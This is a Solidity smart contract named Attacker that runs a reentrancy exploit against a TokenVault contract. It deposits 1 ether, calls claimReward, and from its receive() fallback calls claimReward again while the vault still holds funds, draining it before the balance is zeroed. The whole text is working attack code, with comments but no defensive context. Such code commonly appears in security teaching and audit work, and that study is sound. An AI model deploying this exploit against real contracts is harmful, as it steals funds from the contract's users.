contract Attacker {
    TokenVault public vault;

    constructor(address _vault) payable {
        vault = TokenVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}(); // become eligible
        vault.claimReward();             // trigger first call
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.claimReward();  // re-enter before balance is zeroed
        }
    }
}
